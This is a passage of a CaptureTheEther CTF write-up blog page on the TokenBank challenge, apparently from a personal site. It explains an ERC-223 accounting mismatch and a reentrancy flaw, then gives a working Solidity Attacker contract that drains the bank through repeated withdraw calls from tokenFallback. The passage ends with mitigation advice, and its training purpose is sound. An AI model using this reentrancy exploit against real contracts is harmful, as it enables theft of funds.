+<span class="ln">29</span>        <span class="n">balanceOf</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">amount</span><span class="p">;</span>
+<span class="ln">30</span>    <span class="p">}</span>
+<span class="ln">31</span><span class="p">}</span>
+</code></pre></div><p>The ERC-223 standard implements a <code>tokenFallback(address, uint256, bytes)</code> function that should be called upon transferring tokens to a contract. This, as stated in the specification, is made to prevent an unintended transfer of tokens to a contract that is not prepared to deal with them.</p>
+<h3 id="vulnerability--attack-vector-1">Vulnerability / Attack vector</h3>
+<p>There are two flaws in this challenge:</p>
+<ul>
+<li>Bad accounting of tokens in the <code>TokenBankChallenge</code> contract. The bank contract accounting is different from the token contract accounting.</li>
+<li>There's an external call with a potential reentrancy vulnerability in line 46 of the first contract code listing.</li>
+</ul>
+<h3 id="solution-1">Solution</h3>
+<p>Upon creation, the challenge contract (<code>TokenBankChallenge</code>) mints 1000000 tokens, and in its internal accounting, gives half of it to the contract deployer, and the other half to the player. However, the <code>SimpleERC223Token</code> constructor has an independent accounting and the full million tokens are owned by the challenge contract.</p>
+<p>When someone calls <code>withdraw(uint256)</code>, the function calls the <code>transfer(address, uint256)</code> method of the token, and after that, it updates the balances. The token’s contract calls the target’s <code>tokenFallback(address, uint256, bytes)</code> function if the receiver of a transfer is a contract, in order to trigger an update of its internal accounting.</p>
+<p>The reentrancy attack lies in the order of operations in that scenario. The external call is made first, and the balances are updated later. We can take advantage of this call by creating a contract that transfers some tokens to the challenge contract, and then exploits the reentrancy bug, emptying the balance. To do this, the attacking contract should have some SET tokens, so there must be a manual transfer from the player to the contract, by means of calling <code>transfer(address, uint256)</code> on the token contract with appropriate parameters.</p>
+<p>Once the attacker contract has some SET balance, the exploit can take place. Here’s the code I used for the attack:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="kd">contract</span> <span class="nc">Attacker</span> <span class="k">is</span> <span class="n">ITokenReceiver</span> <span class="p">{</span>
+<span class="ln"> 2</span>    <span class="n">SimpleERC223Token</span> <span class="n">token</span><span class="p">;</span>
+<span class="ln"> 3</span>    <span class="n">TokenBankChallenge</span> <span class="n">target</span><span class="p">;</span>
+<span class="ln"> 4</span>    <span class="kt">bool</span> <span class="n">funded</span><span class="p">;</span>
+<span class="ln"> 5</span>    
+<span class="ln"> 6</span>    <span class="kd">function</span> <span class="nf">Attacker</span><span class="p">(</span><span class="kt">address</span> <span class="n">_tokenAddr</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_target</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln"> 7</span>        <span class="n">token</span> <span class="o">=</span> <span class="n">SimpleERC223Token</span><span class="p">(</span><span class="n">_tokenAddr</span><span class="p">);</span>
+<span class="ln"> 8</span>        <span class="n">target</span> <span class="o">=</span> <span class="n">TokenBankChallenge</span><span class="p">(</span><span class="n">_target</span><span class="p">);</span>
+<span class="ln"> 9</span>    <span class="p">}</span>
+<span class="ln">10</span>    
+<span class="ln">11</span>    <span class="kd">function</span> <span class="nf">attack</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">12</span>        <span class="n">token</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="mi">500000</span> <span class="o">*</span> <span class="mi">10</span><span class="o">**</span><span class="mi">18</span><span class="p">);</span>
+<span class="ln">13</span>        <span class="n">funded</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="ln">14</span>        <span class="n">target</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="mi">500000</span> <span class="o">*</span> <span class="mi">10</span><span class="o">**</span><span class="mi">18</span><span class="p">);</span>
+<span class="ln">15</span>    <span class="p">}</span>
+<span class="ln">16</span>    
+<span class="ln">17</span>    <span class="kd">function</span> <span class="nf">tokenFallback</span><span class="p">(</span><span class="kt">address</span> <span class="k">from</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">,</span> <span class="kt">bytes</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+<span class="ln">18</span>        <span class="k">if</span><span class="p">(</span><span class="n">funded</span> <span class="o">==</span> <span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+<span class="ln">19</span>            <span class="k">while</span><span class="p">(</span><span class="n">token</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> 
+<span class="ln">20</span>                <span class="n">target</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="mi">500000</span> <span class="o">*</span> <span class="mi">10</span><span class="o">**</span><span class="mi">18</span><span class="p">);</span>
+<span class="ln">21</span>            <span class="p">}</span>
+<span class="ln">22</span>        <span class="p">}</span>
+<span class="ln">23</span>    <span class="p">}</span>
+<span class="ln">24</span><span class="p">}</span>
+</code></pre></div><h3 id="conclusions-1">Conclusions</h3>
+<p>Reentrancy attacks are a common occurrence when dealing with external calls to unknown functions. It is recommended to follow the <a href="https://docs.soliditylang.org/en/latest/security-considerations.html#re-entrancy">check-effects-interactions</a> pattern, and if needed, implement mitigations such as <a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard">OpenZeppelin's ReentrancyGuard</a>.</p>
+    </div>
+
+	<h2 class="post_related">Posts in this Series</h2>
+	<ul>
+	  
+	</ul>
+
+<div class="post_comments">
+  <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "tqts" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+  
+</div>
+
+
+
+  </article>
+<aside class="sidebar">
+  <section class="sidebar_inner">
+        <h2>tqts</h2>
+      <div class="author_bio">
+        Engineer, maker, hobbyist.
+      </div>
+      <a href='https://tqts.ar/about/' class="button mt-1" role="button" title='Read More'>Read More</a>
+    
+      
+	    <h2 class="mt-4">Posts in this series</h2>
+      <ul>
+        
+      </ul>
+    
+    <h2 class="mt-4">Recent Posts</h2>
+    <ul class="flex-column">
+      <li>
+        <a href="https://tqts.ar/post/capturetheether-4/" class="nav-link" title="Solving CaptureTheEther - Part 4 of 5 - Accounts">Solving CaptureTheEther - Part 4 of 5 - Accounts</a>
+      </li>
+      <li>
+        <a href="https://tqts.ar/post/capturetheether-3/" class="nav-link" title="Solving CaptureTheEther - Part 3 of 5 - Math">Solving CaptureTheEther - Part 3 of 5 - Math</a>
+      </li>
+      <li>
+        <a href="https://tqts.ar/post/capturetheether-2/" class="nav-link" title="Solving CaptureTheEther - Part 2 of 5 - Lotteries">Solving CaptureTheEther - Part 2 of 5 - Lotteries</a>
+      </li>
+      <li>
+        <a href="https://tqts.ar/post/capturetheether-1/" class="nav-link" title="Solving CaptureTheEther - Part 1 of 5 - Warmup">Solving CaptureTheEther - Part 1 of 5 - Warmup</a>
+      </li>
+    </ul>
+    <div>
+      <h2 class="mt-4 taxonomy" id="categories-section">Categories</h2>
+      <nav class="tags_nav">
+        <a href='https://tqts.ar/categories/ctf-writeups/' class="post_tag button button_translucent" title="ctf-writeups">
+          CTF-WRITEUPS
+          <span class="button_tally">5</span>
+        </a>
+        
+        
+      </nav>
+    </div>
+    <div>
+      <h2 class="mt-4 taxonomy" id="series-section">Series</h2>
+      <nav class="tags_nav">
+        <a href='https://tqts.ar/series/capturetheether/' class="post_tag button button_translucent" title="capturetheether">
+          CAPTURETHEETHER
+          <span class="button_tally">5</span>
+        </a>
+        
+        
+      </nav>
+    </div>
+    <div>
+      <h2 class="mt-4 taxonomy" id="tags-section">Tags</h2>
+      <nav class="tags_nav">
+        <a href='https://tqts.ar/tags/remix/' class="post_tag button button_translucent" title="remix">
+          REMIX
+          <span class="button_tally">5</span>
+        </a>
+        
+        <a href='https://tqts.ar/tags/solidity/' class="post_tag button button_translucent" title="solidity">
+          SOLIDITY
+          <span class="button_tally">4</span>
+        </a>
+        
+        <a href='https://tqts.ar/tags/python/' class="post_tag button button_translucent" title="python">
+          PYTHON
+          <span class="button_tally">2</span>
+        </a>
+        
+        
+      </nav>
+    </div>
+  </section>
+</aside>
+
+  
+</div>
+    </main><svg width="0" height="0" class="hidden">
+  <symbol viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" id="facebook">
+    <path d="M437 0H75C33.648 0 0 33.648 0 75v362c0 41.352 33.648 75 75 75h151V331h-60v-90h60v-61c0-49.629 40.371-90 90-90h91v90h-91v61h91l-15 90h-76v181h121c41.352 0 75-33.648 75-75V75c0-41.352-33.648-75-75-75zm0 0"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 18.001 18.001" id="twitter">
+    <path d="M15.891 4.013c.808-.496 1.343-1.173 1.605-2.034a8.68 8.68 0 0 1-2.351.861c-.703-.756-1.593-1.14-2.66-1.14-1.043 0-1.924.366-2.643 1.078a3.56 3.56 0 0 0-1.076 2.605c0 .309.039.585.117.819-3.076-.105-5.622-1.381-7.628-3.837-.34.601-.51 1.213-.51 1.846 0 1.301.549 2.332 1.645 3.089-.625-.053-1.176-.211-1.645-.47 0 .929.273 1.705.82 2.388a3.623 3.623 0 0 0 2.115 1.291c-.312.08-.641.118-.979.118-.312 0-.533-.026-.664-.083.23.757.664 1.371 1.291 1.841a3.652 3.652 0 0 0 2.152.743C4.148 14.173 2.625 14.69.902 14.69c-.422 0-.721-.006-.902-.038 1.697 1.102 3.586 1.649 5.676 1.649 2.139 0 4.029-.542 5.674-1.626 1.645-1.078 2.859-2.408 3.639-3.974a10.77 10.77 0 0 0 1.172-4.892v-.468a7.788 7.788 0 0 0 1.84-1.921 8.142 8.142 0 0 1-2.11.593z"
+      ></path>
+  </symbol>
+  <symbol aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="mail">
+    <path  d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="calendar">
+    <path d="M452 40h-24V0h-40v40H124V0H84v40H60C26.916 40 0 66.916 0 100v352c0 33.084 26.916 60 60 60h392c33.084 0 60-26.916 60-60V100c0-33.084-26.916-60-60-60zm20 412c0 11.028-8.972 20-20 20H60c-11.028 0-20-8.972-20-20V188h432v264zm0-304H40v-48c0-11.028 8.972-20 20-20h24v40h40V80h264v40h40V80h24c11.028 0 20 8.972 20 20v48z"></path>
+    <path d="M76 230h40v40H76zm80 0h40v40h-40zm80 0h40v40h-40zm80 0h40v40h-40zm80 0h40v40h-40zM76 310h40v40H76zm80 0h40v40h-40zm80 0h40v40h-40zm80 0h40v40h-40zM76 390h40v40H76zm80 0h40v40h-40zm80 0h40v40h-40zm80 0h40v40h-40zm80-80h40v40h-40z"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="github">
+    <path d="M255.968 5.329C114.624 5.329 0 120.401 0 262.353c0 113.536 73.344 209.856 175.104 243.872 12.8 2.368 17.472-5.568 17.472-12.384 0-6.112-.224-22.272-.352-43.712-71.2 15.52-86.24-34.464-86.24-34.464-11.616-29.696-28.416-37.6-28.416-37.6-23.264-15.936 1.728-15.616 1.728-15.616 25.696 1.824 39.2 26.496 39.2 26.496 22.848 39.264 59.936 27.936 74.528 21.344 2.304-16.608 8.928-27.936 16.256-34.368-56.832-6.496-116.608-28.544-116.608-127.008 0-28.064 9.984-51.008 26.368-68.992-2.656-6.496-11.424-32.64 2.496-68 0 0 21.504-6.912 70.4 26.336 20.416-5.696 42.304-8.544 64.096-8.64 21.728.128 43.648 2.944 64.096 8.672 48.864-33.248 70.336-26.336 70.336-26.336 13.952 35.392 5.184 61.504 2.56 68 16.416 17.984 26.304 40.928 26.304 68.992 0 98.72-59.84 120.448-116.864 126.816 9.184 7.936 17.376 23.616 17.376 47.584 0 34.368-.32 62.08-.32 70.496 0 6.88 4.608 14.88 17.6 12.352C438.72 472.145 512 375.857 512 262.353 512 120.401 397.376 5.329 255.968 5.329z"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 212 212" id="gitlab">
+    <path d="M12.3 74.7h54L43.3 3c-1-3.6-6.4-3.6-7.6 0L12.3 74.8z" />
+    <path d="M12.3 74.7L.5 111c-1 3.2 0 6.8 3 8.8l101.6 74-92.5-119z"/>
+    <path d="M105 193.7l-38.6-119h-54l92.7 119z"/>
+    <path d="M105 193.7l38.7-119H66.4l38.7 119z"/>
+    <path d="M105 193.7l38.7-119H198l-93 119z"/>
+    <path d="M198 74.7l11.6 36.2c1 3 0 6.6-3 8.6l-101.5 74 93-119z"/>
+    <path d="M198 74.7h-54.3L167 3c1.2-3.6 6.4-3.6 7.6 0L198 74.8z"/> 
+  </symbol>
+  <symbol viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" id="rss">
+    <circle cx="3.429" cy="20.571" r="3.429"></circle>
+    <path d="M11.429 24h4.57C15.999 15.179 8.821 8.001 0 8v4.572c6.302.001 11.429 5.126 11.429 11.428z"></path>
+    <path d="M24 24C24 10.766 13.234 0 0 0v4.571c10.714 0 19.43 8.714 19.43 19.429z"></path>
+  </symbol>
+  <symbol viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" id="linkedin">
+    <path d="M437 0H75C33.648 0 0 33.648 0 75v362c0 41.352 33.648 75 75 75h362c41.352 0 75-33.648 75-75V75c0-41.352-33.648-75-75-75zM181 406h-60V196h60zm0-240h-60v-60h60zm210 240h-60V286c0-16.54-13.46-30-30-30s-30 13.46-30 30v120h-60V196h60v11.309C286.719 202.422 296.93 196 316 196c40.691.043 75 36.547 75 79.688zm0 0"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 612 612" id="arrow">
+    <path d="M604.501 440.509L325.398 134.956c-5.331-5.357-12.423-7.627-19.386-7.27-6.989-.357-14.056 1.913-19.387 7.27L7.499 440.509c-9.999 10.024-9.999 26.298 0 36.323s26.223 10.024 36.222 0l262.293-287.164L568.28 476.832c9.999 10.024 26.222 10.024 36.221 0 9.999-10.023 9.999-26.298 0-36.323z"></path>
+  </symbol>
+  <symbol viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" id="carly">
+    <path d="M504.971 239.029L448 182.059V84c0-46.317-37.682-84-84-84h-44c-13.255 0-24 10.745-24 24s10.745 24 24 24h44c19.851 0 36 16.149 36 36v108c0 6.365 2.529 12.47 7.029 16.971L454.059 256l-47.029 47.029A24.002 24.002 0 0 0 400 320v108c0 19.851-16.149 36-36 36h-44c-13.255 0-24 10.745-24 24s10.745 24 24 24h44c46.318 0 84-37.683 84-84v-98.059l56.971-56.971c9.372-9.372 9.372-24.568 0-33.941zM112 192V84c0-19.851 16.149-36 36-36h44c13.255 0 24-10.745 24-24S205.255 0 192 0h-44c-46.318 0-84 37.683-84 84v98.059l-56.971 56.97c-9.373 9.373-9.373 24.568 0 33.941L64 329.941V428c0 46.317 37.682 84 84 84h44c13.255 0 24-10.745 24-24s-10.745-24-24-24h-44c-19.851 0-36-16.149-36-36V320c0-6.365-2.529-12.47-7.029-16.971L57.941 256l47.029-47.029A24.002 24.002 0 0 0 112 192z"></path>
+  </symbol>
+  <symbol viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" id="copy">
+    <path d="M23 2.75A2.75 2.75 0 0 0 20.25 0H8.75A2.75 2.75 0 0 0 6 2.75v13.5A2.75 2.75 0 0 0 8.75 19h11.5A2.75 2.75 0 0 0 23 16.25zM18.25 14.5h-7.5a.75.75 0 0 1 0-1.5h7.5a.75.75 0 0 1 0 1.5zm0-3h-7.5a.75.75 0 0 1 0-1.5h7.5a.75.75 0 0 1 0 1.5zm0-3h-7.5a.75.75 0 0 1 0-1.5h7.5a.75.75 0 0 1 0 1.5z"></path>
+    <path d="M8.75 20.5a4.255 4.255 0 0 1-4.25-4.25V2.75c0-.086.02-.166.025-.25H3.75A2.752 2.752 0 0 0 1 5.25v16A2.752 2.752 0 0 0 3.75 24h12a2.752 2.752 0 0 0 2.75-2.75v-.75z"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512.001 512.001" id="closeme">
+    <path d="M284.286 256.002L506.143 34.144c7.811-7.811 7.811-20.475 0-28.285-7.811-7.81-20.475-7.811-28.285 0L256 227.717 34.143 5.859c-7.811-7.811-20.475-7.811-28.285 0-7.81 7.811-7.811 20.475 0 28.285l221.857 221.857L5.858 477.859c-7.811 7.811-7.811 20.475 0 28.285a19.938 19.938 0 0 0 14.143 5.857 19.94 19.94 0 0 0 14.143-5.857L256 284.287l221.857 221.857c3.905 3.905 9.024 5.857 14.143 5.857s10.237-1.952 14.143-5.857c7.811-7.811 7.811-20.475 0-28.285L284.286 256.002z"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="open-menu">
+    <path d="M492 236H20c-11.046 0-20 8.954-20 20s8.954 20 20 20h472c11.046 0 20-8.954 20-20s-8.954-20-20-20zm0-160H20C8.954 76 0 84.954 0 96s8.954 20 20 20h472c11.046 0 20-8.954 20-20s-8.954-20-20-20zm0 320H20c-11.046 0-20 8.954-20 20s8.954 20 20 20h472c11.046 0 20-8.954 20-20s-8.954-20-20-20z"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" id="instagram">
+    <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" id=youtube>
+    <path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"/>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" id="stackoverflow">
+    <path d="M21 27v-8h3v11H0V19h3v8h18z"></path><path d="M17.1.2L15 1.8l7.9 10.6 2.1-1.6L17.1.2zm3.7 14.7L10.6 6.4l1.7-2 10.2 8.5-1.7 2zM7.2 12.3l12 5.6 1.1-2.4-12-5.6-1.1 2.4zm-1.8 6.8l13.56 1.96.17-2.38-13.26-2.55-.47 2.97zM19 25H5v-3h14v3z"></path>
+  </symbol>
+</svg>
+
+
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js" integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<footer class="footer">
+  <div class="footer_inner wrap pale">
+    <img src='https://tqts.ar/logos/footer.png' class="icon icon_2 transparent" alt="tqts.ar">
+    <p><span class="year"></span> - &nbsp;Written by tqts. All content under Creative Commons  <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">by-nc-sa</a></p><a class="to_top" href="#documentTop">
+  <svg class="icon">
+  <use xlink:href="#arrow"></use>
+</svg>
+</a>
+
+  </div>
+</footer>
+
+    <script type="text/javascript" src="https://tqts.ar/js/bundle.min.061d04727b51b0a8fafe2f15b9370a961f33306e7af52abd00d69c906f5d825f1599306159d7756d7d2b4f359767a170625ae541d1f37d05c1daa4d5c7feec25.js" integrity="sha512-Bh0EcntRsKj6/i8VuTcKlh8zMG569Sq9ANackG9dgl8VmTBhWdd1bX0rTzWXZ6FwYlrlQdHzfQXB2qTVx/7sJQ==" crossorigin="anonymous"></script>
+    
+  </body>
+</html>
